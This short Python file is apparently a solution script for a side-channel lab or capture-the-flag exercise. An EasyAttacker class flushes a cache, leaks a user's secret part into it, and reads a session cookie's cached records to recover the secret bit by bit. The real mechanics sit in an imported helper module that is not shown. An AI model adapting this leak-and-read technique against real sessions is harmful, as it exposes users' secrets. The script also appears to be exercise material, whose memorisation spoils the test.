from attack_util import *

class EasyAttacker(Attacker):
    CACHE_NAME = 'cache_for_part_to_dict'
    
    @property
    def session_cache(self):
        return self.get_cookie_data(self.CACHE_NAME)       
    
    def find_part(self, part):
        self.flush_cache_from_part(part)
        self.leak_user_part_to_cache(part)
        for record in self.session_cache:
            if part in record.lower():
                return part_repr_to_bits(record[1:-2])
    
if __name__ == '__main__':
    print(EasyAttacker.attack())